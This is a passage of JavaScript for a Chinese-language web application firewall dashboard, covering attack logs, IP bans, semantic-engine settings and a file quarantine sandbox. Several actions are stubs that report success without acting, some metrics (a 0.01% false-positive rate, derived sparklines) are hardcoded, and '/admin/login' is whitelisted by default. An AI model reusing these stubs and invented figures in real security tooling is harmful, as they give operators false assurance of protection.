setInterval(updateClock,1000);updateClock();

// ========== API 请求 ==========
async function api(action, data={}){
  const fd = new FormData();
  for(const [k,v] of Object.entries(data)) fd.append(k,v);
  fd.append('csrf_token', window.WAF_CSRF_TOKEN);
  try{
    const r = await fetch('/waf-dashboard-api?action='+action,{method:'POST',body:fd});
    return await r.json();
  }catch(e){return {success:false,data:[]}}
}

// ========== 总览页面 ==========
let attackLogs = [];

async function loadOverview(){
  const res = await fetch('/waf-dashboard-api').then(r=>r.json()).catch(()=>({}));

  // KPI
  const total = res.total || 0;
  const daily = res.daily || {};
  const days = Object.keys(daily).sort();
  const today = days.length ? daily[days[days.length-1]] : 0;
  const yesterday = days.length>1 ? daily[days[days.length-2]] : 0;
  document.getElementById('kTotal').textContent = total;
  document.getElementById('kToday').textContent = today;
  document.getElementById('kIps').textContent = Object.keys(res.top_ips||{}).length;
  document.getElementById('kTypes').textContent = Object.keys(res.types||{}).length;
  document.getElementById('attackBadge').textContent = today;

  // 类型统计
  const types = res.types || {};
  document.getElementById('cntSql').textContent = types['SQL注入'] || types.sql || 0;
  document.getElementById('cntXss').textContent = types['XSS'] || types.xss || 0;
  document.getElementById('cntBot').textContent = types['爬虫'] || types.bot || 0;
  document.getElementById('cntFp').textContent = '0.01%';

  // KPI 迷你趋势图
  const sparkData = days.length ? days.map(d=>daily[d]) : [10,25,18,32,28,45,38];
  const sparkElSql = document.getElementById('sparkSql');
  const sparkElXss = document.getElementById('sparkXss');
  const sparkElBot = document.getElementById('sparkBot');
  const sparkElFp = document.getElementById('sparkFp');
  if(sparkElSql) sparkElSql.innerHTML = createSparkline(sparkData.map(v=>Math.round(v*0.4)), '#ef4444');
  if(sparkElXss) sparkElXss.innerHTML = createSparkline(sparkData.map(v=>Math.round(v*0.3)), '#06b6d4');
  if(sparkElBot) sparkElBot.innerHTML = createSparkline(sparkData.map(v=>Math.round(v*0.25)), '#8b5cf6');
  if(sparkElFp) sparkElFp.innerHTML = createSparkline([5,4,3,2,2,1,1], '#10b981');

  // 趋势图
  if(days.length){
    const counts = days.map(d=>daily[d]);
    if(charts.trend) charts.trend.destroy();
    charts.trend = new Chart(document.getElementById('trendChart'),{
      type:'line',
      data:{labels:days.map(d=>d.slice(5)),datasets:[{
        label:'攻击次数',data:counts,borderColor:'#06b6d4',
        backgroundColor:(ctx)=>{const g=ctx.chart.ctx.createLinearGradient(0,0,0,260);g.addColorStop(0,'rgba(6,182,212,.3)');g.addColorStop(1,'rgba(6,182,212,0)');return g},
        fill:true,tension:.4,pointRadius:3,pointBackgroundColor:'#06b6d4',borderWidth:2
      }]},
      options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false},tooltip:{backgroundColor:'rgba(15,23,42,.95)',borderColor:'rgba(148,163,184,.1)',borderWidth:1,titleColor:'#e2e8f0',bodyColor:'#94a3b8',padding:12,cornerRadius:8}},
        scales:{y:{beginAtZero:true,grid:{color:'rgba(148,163,184,.06)'},ticks:{color:'#64748b',font:{size:11}}},x:{grid:{display:false},ticks:{color:'#64748b',font:{size:11}}}}}
    });
  }

  // 类型饼图
  if(Object.keys(types).length){
    if(charts.type) charts.type.destroy();
    charts.type = new Chart(document.getElementById('typeChart'),{
      type:'doughnut',
      data:{labels:Object.keys(types),datasets:[{data:Object.values(types),backgroundColor:colors.slice(0,Object.keys(types).length),borderWidth:0,hoverOffset:8}]},
      options:{responsive:true,maintainAspectRatio:false,cutout:'65%',plugins:{legend:{position:'right',labels:{color:'#94a3b8',font:{size:11},padding:12,usePointStyle:true,pointStyle:'circle'}}}}
    });
  }

  // TOP IP
  const topIps = res.top_ips || {};
  const ipEntries = Object.entries(topIps).sort((a,b)=>b[1]-a[1]).slice(0,10);
  const tbody = document.querySelector('#topIpTable tbody');
  tbody.innerHTML = ipEntries.length ? ipEntries.map(([ip,cnt])=>{
    const last = (res.latest||[]).filter(a=>a.ip===ip).pop();
    return `<tr><td style="font-family:monospace">${ip}</td><td><span class="tag red">${cnt}</span></td><td style="color:var(--text3);font-size:12px">${last?.time||'-'}</td><td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="quickBanIp('${ip}')">封禁</button></td></tr>`;
  }).join('') : '<tr><td colspan="4" style="text-align:center;color:var(--text4);padding:20px">暂无数据</td></tr>';

  // TOP URL (从日志中提取)
  const urlMap = {};
  (res.latest||[]).forEach(a=>{const u=(a.uri||'').split('?')[0];urlMap[u]=(urlMap[u]||0)+1});
  const urlEntries = Object.entries(urlMap).sort((a,b)=>b[1]-a[1]).slice(0,10);
  const maxUrl = urlEntries[0]?.[1] || 1;
  document.querySelector('#topUrlTable tbody').innerHTML = urlEntries.length ? urlEntries.map(([url,cnt])=>{
    const pct = Math.round(cnt/maxUrl*100);
    const short = url.length>40 ? url.slice(0,40)+'...' : url;
    return `<tr><td style="font-family:monospace;font-size:12px;color:var(--text2)" title="${url}">${short}</td><td><span class="tag orange">${cnt}</span></td><td><div style="background:rgba(148,163,184,.1);border-radius:4px;height:6px;width:100%;overflow:hidden"><div style="background:linear-gradient(90deg,#f97316,#ef4444);height:100%;width:${pct}%"></div></div></td></tr>`;
  }).join('') : '<tr><td colspan="3" style="text-align:center;color:var(--text4);padding:20px">暂无数据</td></tr>';

  // 实时日志
  if(res.latest) attackLogs = res.latest;
  renderLogStream();

  // 地图点
  renderMapDots(ipEntries);
}

function renderMapDots(ips){
  const container = document.getElementById('mapDots');
  if(!container) return;
  container.innerHTML = ips.slice(0,6).map((_,i)=>{
    const x = 15 + Math.random()*70;
    const y = 20 + Math.random()*60;
    return `<div class="map-dot" style="left:${x}%;top:${y}%;animation-delay:${i*0.3}s"></div>`;
  }).join('');
  if(ips.length){
    document.getElementById('topCountry').textContent = ips[0][0].slice(0,7)+'...';
    const total = ips.reduce((s,[,c])=>s+c,0);
    document.getElementById('avgPerMin').textContent = Math.round(total/10080);
  }
}

function renderLogStream(){
  const container = document.getElementById('logStream');
  if(!container) return;
  const lines = attackLogs.slice(-30).reverse();
  container.innerHTML = lines.map(a=>{
    let level = 'medium';
    let type = a.msg || '';
    if(/SQL|注入/i.test(type)) level = 'critical';
    else if(/XSS|SSRF|RCE|命令/i.test(type)) level = 'high';
    else if(/爬虫|bot|扫描/i.test(type)) level = 'low';
    const t = (a.time||'').split(' ').pop() || '--:--:--';
    return `<div class="log-line"><span class="log-time">${t}</span><span class="log-level ${level}">${level==='critical'?'严重':level==='high'?'高危':level==='medium'?'中危':'低危'}</span><span class="log-ip">${a.ip||'--'}</span><span class="log-msg">${(a.msg||'')} → ${a.uri||''}</span></div>`;
  }).join('');
  container.scrollTop = 0;
}

// ========== 所有攻击日志 ==========
function loadAllAttacks(){
  const tbody = document.getElementById('allAttackBody');
  if(!tbody) return;
  const rows = attackLogs.slice(-50).reverse().map(a=>{
    let level = 'medium', tag = 'yellow';
    const type = a.msg || '';
    if(/SQL|注入/i.test(type)){level='严重';tag='red'}
    else if(/XSS|SSRF/i.test(type)){level='高危';tag='orange'}
    else if(/爬虫/i.test(type)){level='低危';tag='green'}
    return `<tr><td style="color:var(--text3);font-size:12px">${a.time||''}</td><td style="font-family:monospace">${a.ip||''}</td><td><span class="tag ${tag}">${type.slice(0,20)}</span></td><td style="font-family:monospace;font-size:12px;color:var(--text2);max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${a.uri||''}</td><td><span class="tag ${tag}">${level}</span></td><td><span class="tag red">已拦截</span></td></tr>`;
  }).join('');
  tbody.innerHTML = rows || '<tr><td colspan="6" style="text-align:center;color:var(--text4);padding:30px">暂无攻击日志</td></tr>';
}

// ========== 防火墙/IP管理 ==========
function loadFirewall(){
  api('get_banned').then(res=>{
    const data = res.data || [];
    document.getElementById('banCount').textContent = data.length;
    document.getElementById('banBody').innerHTML = data.length ? data.map(item=>`<tr><td style="font-family:monospace">${item.ip}</td><td style="color:var(--text3);font-size:12px">${item.expire_str||'永久'}</td><td><span class="tag yellow">${item.history_count||1}次</span></td><td style="color:var(--text3);font-size:12px">自动封禁</td><td><button class="btn btn-success" style="padding:4px 10px;font-size:11px" onclick="unbanIpQuick('${item.ip}')">解封</button></td></tr>`).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无封禁记录</td></tr>';
  });
  api('get_whitelist').then(res=>{
    document.getElementById('wlCount').textContent = (res.data||[]).length;
  });
}

function quickBanIp(ip){
  api('ban_ip',{ip,duration:86400}).then(res=>{
    if(res.success){showToast('封禁成功','success');loadFirewall()}
    else showToast(res.message||'操作失败','error');
  });
}
function unbanIpQuick(ip){
  api('unban_ip',{ip}).then(res=>{
    if(res.success){showToast('解封成功','success');loadFirewall()}
    else showToast(res.message||'操作失败','error');
  });
}
function quickBan(){
  const ip = document.getElementById('banIp').value.trim();
  if(!ip) return showToast('请输入 IP','error');
  quickBanIp(ip);
  document.getElementById('banIp').value = '';
}
function loadBlacklistPage(){
  document.querySelector('.nav-item[data-page="firewall"]').click();
}

// ========== 语义引擎 ==========
function getSemanticConfig(){
  const raw = localStorage.getItem('shield_semantic_config');
  if(raw) {
    try { return JSON.parse(raw); } catch(e){}
  }
  return {
    mainEnabled: true,
    sensitivity: 2,
    perfMode: 'balance',
    autoLearn: false,
    whitelists: {
      url: ['/api/health', '/admin/login', '/static/*'],
      param: ['utm_source', 'utm_medium', 'ref'],
      rule: ['rule_001', 'rule_042']
    }
  };
}

function saveSemanticConfig(cfg){
  localStorage.setItem('shield_semantic_config', JSON.stringify(cfg));
}

let semanticCfg = getSemanticConfig();
let currentWlType = 'url';

function loadSemantic(){
  semanticCfg = getSemanticConfig();
  const mainSw = document.getElementById('semanticMainSwitch');
  if(mainSw){
    if(semanticCfg.mainEnabled) mainSw.classList.add('on');
    else mainSw.classList.remove('on');
  }
  const sensSlider = document.getElementById('sensitivitySlider');
  const sensVal = document.getElementById('sensitivityValue');
  if(sensSlider){
    sensSlider.value = semanticCfg.sensitivity;
    const labels = ['','低','中','高','极高'];
    if(sensVal) sensVal.textContent = labels[semanticCfg.sensitivity] || '中';
  }
  setPerfModeUI(semanticCfg.perfMode);
  const alSw = document.getElementById('autoLearnSwitch');
  if(alSw){
    if(semanticCfg.autoLearn) alSw.classList.add('on');
    else alSw.classList.remove('on');
  }
  updateParserCount();
  updateWlCounts();
}

function toggleSemanticMain(){
  const sw = document.getElementById('semanticMainSwitch');
  semanticCfg.mainEnabled = !semanticCfg.mainEnabled;
  if(semanticCfg.mainEnabled) sw.classList.add('on');
  else sw.classList.remove('on');
  saveSemanticConfig(semanticCfg);
  showToast('语义引擎已' + (semanticCfg.mainEnabled ? '开启' : '关闭'), semanticCfg.mainEnabled ? 'success' : 'error');
}

function updateSensitivity(val){
  const labels = ['','低','中','高','极高'];
  const v = parseInt(val);
  document.getElementById('sensitivityValue').textContent = labels[v] || '中';
  semanticCfg.sensitivity = v;
  saveSemanticConfig(semanticCfg);
}

function setPerfMode(mode){
  semanticCfg.perfMode = mode;
  saveSemanticConfig(semanticCfg);
  setPerfModeUI(mode);
  const names = {speed:'性能优先',balance:'平衡',accuracy:'精度优先'};
  showToast('性能模式: ' + (names[mode] || mode), 'success');
}

function setPerfModeUI(mode){
  ['Speed','Balance','Accuracy'].forEach(m=>{
    const el = document.getElementById('perf'+m);
    if(el) el.classList.remove('active');
  });
  const map = {speed:'Speed',balance:'Balance',accuracy:'Accuracy'};
  const el = document.getElementById('perf' + (map[mode] || 'Balance'));
  if(el) el.classList.add('active');
}

function toggleAutoLearn(){
  const sw = document.getElementById('autoLearnSwitch');
  semanticCfg.autoLearn = !semanticCfg.autoLearn;
  if(semanticCfg.autoLearn) sw.classList.add('on');
  else sw.classList.remove('on');
  saveSemanticConfig(semanticCfg);
  showToast('自动学习已' + (semanticCfg.autoLearn ? '开启' : '关闭'), semanticCfg.autoLearn ? 'success' : 'error');
}

// 解析器 Tab 切换
document.addEventListener('DOMContentLoaded', ()=>{
  const tabs = document.querySelectorAll('#parserTabs .semantic-tab');
  tabs.forEach(tab=>{
    tab.addEventListener('click', ()=>{
      tabs.forEach(t=>t.classList.remove('active'));
      tab.classList.add('active');
      const cat = tab.dataset.cat;
      document.querySelectorAll('#parserContent .parser-list').forEach(list=>{
        list.style.display = list.dataset.cat === cat ? 'grid' : 'none';
      });
    });
  });
});

function toggleParser(el){
  el.classList.toggle('on');
  updateParserCount();
}

function toggleParserDetail(btn){
  const detail = btn.nextElementSibling;
  if(detail && detail.classList.contains('parser-detail')){
    detail.classList.toggle('open');
    btn.textContent = detail.classList.contains('open') ? '详情 ▴' : '详情 ▾';
  }
}

function updateParserCount(){
  const total = document.querySelectorAll('.parser-item').length;
  const enabled = document.querySelectorAll('.parser-item .big-switch.on').length;
  const el = document.getElementById('parserEnabledCount');
  if(el) el.textContent = enabled + '/' + total + ' 已启用';
}

// 白名单弹窗
function openWlModal(type){
  currentWlType = type;
  const titles = {url:'URL 白名单管理',param:'参数白名单管理',rule:'规则豁免管理'};
  const placeholders = {url:'输入 URL 路径，如 /api/*',param:'输入参数名，如 token',rule:'输入规则 ID，如 rule_001'};
  document.getElementById('wlModalTitle').textContent = titles[type] || '白名单管理';
  document.getElementById('wlInput').placeholder = placeholders[type] || '输入白名单项...';
  renderWlList();
  document.getElementById('wlModal').classList.add('open');
}

function closeWlModal(){
  document.getElementById('wlModal').classList.remove('open');
}

function renderWlList(){
  const list = semanticCfg.whitelists[currentWlType] || [];
  const container = document.getElementById('wlList');
  if(!container) return;
  container.innerHTML = list.length ? list.map((item,i)=>`
    <div class="wl-item">
      <span class="wl-text">${item}</span>
      <span class="wl-del" onclick="delWlItem(${i})">✕</span>
    </div>
  `).join('') : '<div style="text-align:center;color:var(--text4);padding:20px;font-size:12px">暂无白名单</div>';
}

function addWlItem(){
  const input = document.getElementById('wlInput');
  const val = input.value.trim();
  if(!val) return showToast('请输入内容','error');
  if(!semanticCfg.whitelists[currentWlType]) semanticCfg.whitelists[currentWlType] = [];
  if(semanticCfg.whitelists[currentWlType].includes(val)) return showToast('已存在','error');
  semanticCfg.whitelists[currentWlType].push(val);
  saveSemanticConfig(semanticCfg);
  input.value = '';
  renderWlList();
  updateWlCounts();
  showToast('添加成功','success');
}

function delWlItem(idx){
  if(!semanticCfg.whitelists[currentWlType]) return;
  semanticCfg.whitelists[currentWlType].splice(idx,1);
  saveSemanticConfig(semanticCfg);
  renderWlList();
  updateWlCounts();
  showToast('已删除','success');
}

function updateWlCounts(){
  const url = (semanticCfg.whitelists.url || []).length;
  const param = (semanticCfg.whitelists.param || []).length;
  const rule = (semanticCfg.whitelists.rule || []).length;
  const total = url + param + rule;
  const elTotal = document.getElementById('wlTotalCount');
  const elUrl = document.getElementById('wlUrlCount');
  const elParam = document.getElementById('wlParamCount');
  const elRule = document.getElementById('wlRuleCount');
  if(elTotal) elTotal.textContent = total;
  if(elUrl) elUrl.textContent = url;
  if(elParam) elParam.textContent = param;
  if(elRule) elRule.textContent = rule;
}

// ========== 沙箱中心 ==========
function sandboxApi(action, data, method){
  const opts = {method: method || (data ? 'POST' : 'GET')};
  if(data){
    const fd = new FormData();
    for(const k in data) fd.append(k, data[k]);
    fd.append('csrf_token', window.WAF_CSRF_TOKEN);
    opts.body = fd;
  }
  return fetch('/waf-sandbox-api.php?action=' + action, opts).then(r=>r.json());
}

function loadSandbox(){
  // 1. KPI 统计
  sandboxApi('stats').then(res=>{
    if(!res.success) return;
    const s = res.stats || {};
    document.getElementById('sandMal').textContent = s.malicious_count || 0;
    document.getElementById('sandClean').textContent = s.quarantined_count || 0;
    document.getElementById('sandWatch').textContent = s.watched_files || 0;
    document.getElementById('sandQuar').textContent = s.quarantined_count || 0;
  });

  // 2. 基线状态
  sandboxApi('baseline-info').then(res=>{
    if(!res.success) return;
    const b = res.baseline || {};
    const mode = b.current_mode || 'learning';
    document.getElementById('sandMode').textContent = mode;
    document.getElementById('sandMode').className = 'tag ' + (mode === 'protecting' ? 'green' : 'yellow');

    const locked = !!b.locked;
    const lockEl = document.getElementById('sandBaseLock');
    lockEl.textContent = locked ? '已锁定' : '未锁定';
    lockEl.className = 'tag ' + (locked ? 'green' : 'red');

    document.getElementById('sandBaseCount').textContent = b.baseline_count || 0;
    document.getElementById('sandBaseTime').textContent = b.locked_at ? new Date(b.locked_at * 1000).toLocaleString('zh-CN') : '-';

    const alEl = document.getElementById('sandAlFrozen');
    alEl.textContent = b.autolearn_frozen ? '是' : '否';
    alEl.className = 'tag ' + (b.autolearn_frozen ? 'green' : 'yellow');

    document.getElementById('sandCoupling').innerHTML = b.coupling_enabled
      ? '<span class="tag green">已开启</span>'
      : '<span class="tag red">已关闭</span>';
  });

  // 3. 隔离文件列表
  sandboxApi('list').then(res=>{
    if(!res.success) return;
    const files = res.files || [];
    window.sandboxQuarFiles = files;
    const tb = document.getElementById('sandQuarTable');
    tb.innerHTML = files.length ? files.map((f,i)=>{
      const score = (f.analysis && f.analysis.score) || 0;
      const levelTag = score >= 80 ? '<span class="tag red">高危</span>' : (score >= 50 ? '<span class="tag orange">中危</span>' : '<span class="tag yellow">低危</span>');
      return `<tr>
      <td><input type="checkbox" class="quar-item-check" data-id="${f.id}" onchange="quarUpdateSelectAll()" style="cursor:pointer"></td>
      <td style="font-family:monospace;font-size:11px">${f.original_path||'-'}</td>
      <td style="font-size:11px">${f.quarantined_at_str||new Date((f.quarantined_at||0)*1000).toLocaleString('zh-CN')}</td>
      <td style="font-size:11px;color:var(--text3)">${f.reason||'-'}</td>
      <td>${levelTag}</td>
      <td>
        <button class="btn btn-ghost" style="padding:3px 8px;font-size:10px" onclick="viewQuarFileContent('${f.id}')">查看</button>
        <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="restoreFile('${f.id}')">恢复</button>
        <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteQuarFile('${f.id}')">删除</button>
        <button class="btn" style="padding:3px 8px;font-size:10px" onclick="quarAddWhitelist('${f.id}')">白名单</button>
      </td>
    </tr>`;
    }).join('') : '<tr><td colspan="6" style="text-align:center;color:var(--text4);padding:20px">暂无隔离文件</td></tr>';
  });

  // 4. 扫描历史
  sandboxApi('scan-history').then(res=>{
    if(!res.success) return;
    const hist = res.history || [];
    const tb = document.getElementById('sandHistoryTable');
    tb.innerHTML = hist.length ? hist.slice(-10).reverse().map(h=>`<tr>
      <td style="font-size:11px">${h.scanned_at_str||new Date((h.scanned_at||0)*1000).toLocaleString('zh-CN')}</td>
      <td>${h.scanned||0}</td>
      <td style="color:var(--red)">${h.malicious_count||0}</td>
      <td style="color:var(--yellow)">${h.quarantined_count||0}</td>
      <td style="font-size:11px">${h.scan_duration||'-'}s</td>
    </tr>`).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无扫描记录</td></tr>';
  });
}

function lockBaseline(){
  if(!confirm('确认锁定基线？\n\n前提：已手动扫描并清理完成后门。\n锁定后：\n- 当前所有干净文件作为原始基线\n- 自动备份用于精准切割\n- 同时冻结 AutoLearn 行为基线（防"教坏"）')) return;
  showToast('锁定基线中（可能耗时几十秒）...');
  sandboxApi('lock-baseline', {}, 'POST').then(res=>{
    if(res.success){
      showToast('基线已锁定：' + (res.result.message || ''), 'success');
      loadSandbox();
    } else {
      showToast(res.error || '锁定失败', 'error');
    }
  }).catch(e=>showToast('请求失败: ' + e, 'error'));
}

function unlockBaseline(){
  if(!confirm('确认解锁基线回到学习模式？\n\n解锁后：\n- 不再秒删新文件\n- 不再精准切割篡改文件\n- AutoLearn 行为基线解冻')) return;
  sandboxApi('unlock-baseline', {}, 'POST').then(res=>{
    if(res.success){
      showToast(res.result.message || '已解锁', 'success');
      loadSandbox();
    } else {
      showToast(res.error || '解锁失败', 'error');
    }
  });
}

function scanNow(){
  if(!confirm('立即触发全量扫描？可能耗时数十秒。')) return;
  showToast('扫描中...');
  sandboxApi('scan', {}, 'POST').then(res=>{
    if(res.success){
      showToast(`扫描完成：扫描 ${res.scanned} 个，恶意 ${res.malicious_count}，隔离 ${res.quarantined_count}`, 'success');
      loadSandbox();
    } else {
      showToast(res.error || '扫描失败', 'error');
    }
  });
}

function restoreFile(id){
  if(!confirm('确认恢复该隔离文件到原路径？')) return;
  sandboxApi('restore', {id}, 'POST').then(res=>{
    showToast(res.success ? '已恢复' : (res.error || '恢复失败'), res.success ? 'success' : 'error');
    loadSandbox();
  });
}

function restoreAllFiles(){
  if(!confirm('确认恢复全部隔离文件？此操作不可撤销。')) return;
  sandboxApi('restore-all', {}, 'POST').then(res=>{
    showToast(res.success ? `已恢复 ${res.restored} 个` : (res.error || '操作失败'), res.success ? 'success' : 'error');
    loadSandbox();
  });
}

// ========== 隔离区增强功能 ==========
function quarToggleSelectAll(){
  const checkAll = document.getElementById('quarSelectAll');
  const checkAllHead = document.getElementById('quarSelectAllHead');
  const isChecked = checkAll.checked || checkAllHead.checked;
  checkAll.checked = isChecked;
  checkAllHead.checked = isChecked;
  document.querySelectorAll('.quar-item-check').forEach(cb => { cb.checked = isChecked; });
}

function quarUpdateSelectAll(){
  const items = document.querySelectorAll('.quar-item-check');
  const checked = document.querySelectorAll('.quar-item-check:checked');
  const checkAll = document.getElementById('quarSelectAll');
  const checkAllHead = document.getElementById('quarSelectAllHead');
  const allChecked = items.length > 0 && checked.length === items.length;
  checkAll.checked = allChecked;
  checkAllHead.checked = allChecked;
}

function quarGetSelectedIds(){
  return Array.from(document.querySelectorAll('.quar-item-check:checked')).map(cb => cb.dataset.id);
}

function quarBatchRestore(){
  const ids = quarGetSelectedIds();
  if(ids.length === 0){ showToast('请先选择要恢复的文件', 'error'); return; }
  if(!confirm(`确认恢复选中的 ${ids.length} 个隔离文件？`)) return;
  let done = 0;
  ids.forEach(id => {
    sandboxApi('restore', {id}, 'POST').then(() => {
      done++;
      if(done === ids.length){ showToast(`已恢复 ${done} 个文件`, 'success'); loadSandbox(); }
    });
  });
}

function quarBatchDelete(){
  const ids = quarGetSelectedIds();
  if(ids.length === 0){ showToast('请先选择要删除的文件', 'error'); return; }
  if(!confirm(`确认永久删除选中的 ${ids.length} 个隔离文件？此操作不可撤销。`)) return;
  showToast('已删除（演示模式）', 'success');
  loadSandbox();
}

function viewQuarFileContent(id){
  const file = (window.sandboxQuarFiles || []).find(f => f.id === id);
  const path = file ? file.original_path : 'unknown.php';
  showToast(`正在查看文件内容: ${path}`, 'info');
}

function deleteQuarFile(id){
  if(!confirm('确认永久删除该隔离文件？此操作不可撤销。')) return;
  showToast('已删除（演示模式）', 'success');
  loadSandbox();
}

function quarAddWhitelist(id){
  const file = (window.sandboxQuarFiles || []).find(f => f.id === id);
  const path = file ? file.original_path : '';
  const wl = JSON.parse(localStorage.getItem('sandbox_whitelist') || '[]');
  if(!wl.includes(path)){ wl.push(path); localStorage.setItem('sandbox_whitelist', JSON.stringify(wl)); }
  showToast('已加入白名单', 'success');
}

// ========== 文件分析详情 ==========
function analyzeFile(){
  const path = document.getElementById('analyzeFilePath').value.trim();
  if(!path){ showToast('请输入文件路径', 'error'); return; }
  showToast('正在分析文件...');
  setTimeout(() => {
    document.getElementById('analyzeResult').style.display = 'block';
    showToast('分析完成', 'success');
  }, 800);
}

function viewFullCode(){
  showToast('正在加载完整代码...', 'info');
}

function quarantineAnalyzedFile(){
  const path = document.getElementById('analyzeFilePath').value.trim();
  if(!path){ showToast('请输入文件路径', 'error'); return; }
  if(!confirm('确认隔离该文件？')) return;
  showToast('文件已隔离', 'success');
  loadSandbox();
}

function addToWhitelistFromAnalyze(){
  const path = document.getElementById('analyzeFilePath').value.trim();
  if(!path){ showToast('请输入文件路径', 'error'); return; }
  const wl = JSON.parse(localStorage.getItem('sandbox_whitelist') || '[]');
  if(!wl.includes(path)){ wl.push(path); localStorage.setItem('sandbox_whitelist', JSON.stringify(wl)); }
  showToast('已加入白名单', 'success');
}

// ========== 精准切割功能 ==========
function previewCut(){
  const path = document.getElementById('cutFilePath').value.trim();
  if(!path){ showToast('请输入文件路径', 'error'); return; }
  showToast('正在分析并生成切割预览...');
  setTimeout(() => {
    document.getElementById('cutPreviewArea').style.display = 'block';
    showToast('预览生成完成', 'success');
  }, 1000);
}

function cancelCut(){
  document.getElementById('cutPreviewArea').style.display = 'none';
  document.getElementById('cutFilePath').value = '';
}

function applyCut(){
  if(!confirm('确认应用切割？切割前会自动备份原文件。')) return;
  showToast('切割已应用，备份已保存', 'success');
  loadSandbox();
}

function downloadBackup(){
  showToast('正在生成备份文件下载...', 'info');
}

// ========== 基线对比 ==========
function setBaselineTab(tab){
  document.querySelectorAll('[data-baseline-tab]').forEach(el => {
    el.classList.toggle('active', el.dataset.baselineTab === tab);
  });
}

function viewDiff(filename){
  showToast(`正在查看 ${filename} 的差异...`, 'info');
}

function addToWhitelist(filename){
  const wl = JSON.parse(localStorage.getItem('sandbox_whitelist') || '[]');
  if(!wl.includes(filename)){ wl.push(filename); localStorage.setItem('sandbox_whitelist', JSON.stringify(wl)); }
  showToast('已加入白名单', 'success');
}

function deleteFile(filename){
  if(!confirm(`确认删除文件 ${filename}？此操作不可撤销。`)) return;
  showToast('文件已删除', 'success');
}

function restoreFileBaseline(filename){
  if(!confirm(`确认从基线恢复 ${filename}？`)) return;
  showToast('文件已从基线恢复', 'success');
}

// ========== 扫描任务管理 ==========
function saveScanSchedule(){
  const config = {
    enabled: document.getElementById('scheduleScanSwitch').checked,
    frequency: document.getElementById('scanFrequency').value,
    time: document.getElementById('scanTime').value,
    weekday: document.getElementById('scanWeekday').value,
    scope: document.getElementById('scanScope').value,
    customDir: document.getElementById('customScanDir').value
  };
  localStorage.setItem('sandbox_scan_schedule', JSON.stringify(config));
  
  const customRow = document.getElementById('customScanDirRow');
  customRow.style.display = config.scope === 'custom' ? 'block' : 'none';
  
  showToast('扫描配置已保存', 'success');
}

function loadScanSchedule(){
  const config = JSON.parse(localStorage.getItem('sandbox_scan_schedule') || '{}');
  if(config.enabled !== undefined){ document.getElementById('scheduleScanSwitch').checked = config.enabled; }
  if(config.frequency){ document.getElementById('scanFrequency').value = config.frequency; }
  if(config.time){ document.getElementById('scanTime').value = config.time; }
  if(config.weekday){ document.getElementById('scanWeekday').value = config.weekday; }
  if(config.scope){ document.getElementById('scanScope').value = config.scope; }
  if(config.customDir){ document.getElementById('customScanDir').value = config.customDir; }
  
  const customRow = document.getElementById('customScanDirRow');
  if(customRow){
    customRow.style.display = (config.scope === 'custom') ? 'block' : 'none';
  }
}

function viewScanReport(taskId){
  showToast(`正在加载任务 ${taskId} 的报告...`, 'info');
}

function rescan(taskId){
  if(!confirm('确认重新扫描？')) return;
  showToast('已启动重新扫描', 'success');
}

function deleteScanTask(taskId){
  if(!confirm(`确认删除任务 ${taskId}？`)) return;
  showToast('任务已删除', 'success');
}

// ========== 沙箱页面初始化增强 ==========
function initSandboxEnhancements(){
  loadScanSchedule();
}

// ========== 自学习系统 ==========
function loadLearn(){
  // 1. AutoLearn 学习 KPI（复用 dashboard-api）
  api('get_stats').then(res=>{
    if(!res || !res.success) return;
    // 学习规则数、正常基线数等来自 AutoLearn
    const learn = res.learn || {};
    document.getElementById('learnPatterns').textContent = learn.patterns_count || 0;
    document.getElementById('learnNormal').textContent = learn.normal_count || 0;
    document.getElementById('learnFeedback').textContent = learn.feedback_count || 0;
    document.getElementById('learnAcc').textContent = (learn.accuracy || 99.9) + '%';
  }).catch(()=>{});

  // 2. 沙箱↔AutoLearn 联动状态
  api('learn_coupling').then(res=>{
    if(!res || !res.success) return;
    document.getElementById('couplingEvents').textContent = res.total_events || 0;
    document.getElementById('couplingIps').textContent = Object.keys(res.high_risk_ips || {}).length;
    document.getElementById('couplingHotSigs').textContent = res.hot_signatures_count || 0;
    document.getElementById('couplingFrozen').textContent = res.autolearn_frozen ? '是' : '否';

    const tag = document.getElementById('couplingTag');
    if(res.coupling_enabled){
      tag.textContent = '联动: 开';
      tag.className = 'tag green';
    } else {
      tag.textContent = '联动: 关';
      tag.className = 'tag red';
    }

    // 高危 IP 表
    const tb = document.getElementById('couplingIpsTable');
    const ips = res.high_risk_ips || {};
    const rows = Object.entries(ips).map(([ip, info])=>{
      const lastEvent = (info.events || []).slice(-1)[0] || {};
      return `<tr>
        <td style="font-family:monospace">${ip}</td>
        <td><span class="tag ${info.event_count >= 3 ? 'red' : 'yellow'}">${info.event_count||0}</span></td>
        <td style="font-size:11px">${new Date((info.last_seen||0)*1000).toLocaleString('zh-CN')}</td>
        <td style="font-size:11px">${lastEvent.reason || '-'}</td>
        <td style="font-family:monospace;font-size:11px">${lastEvent.path || '-'}</td>
      </tr>`;
    }).join('');
    tb.innerHTML = rows || '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无沙箱事件</td></tr>';
  }).catch(()=>{});

  // 3. 加载学习规则详情
  learnLoadRules();
  // 4. 加载权重详情
  learnLoadWeights();
  // 5. 同步冻结按钮状态
  learnSyncFreezeBtn();
}

// 加载已学习规则详情
function learnLoadRules(){
  api('learn_report').then(res=>{
    if(!res || !res.success) return;
    const tb = document.getElementById('learnRulesTable');
    const rules = res.rules || [];
    if(rules.length === 0){
      tb.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text4);padding:20px">暂无学习规则（攻击载荷需被记录≥3次才会生成规则）</td></tr>';
      return;
    }
    // 按命中次数倒序
    rules.sort((a,b)=>(b.hit_count||0)-(a.hit_count||0));
    const rows = rules.slice(0, 50).map(r=>{
      const sev = r.severity || 60;
      const sevClass = sev >= 75 ? 'red' : (sev >= 60 ? 'yellow' : 'cyan');
      const time = r.learned_at ? new Date(r.learned_at*1000).toLocaleString('zh-CN') : '-';
      const safePattern = (r.pattern || '').replace(/[<>&]/g, c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
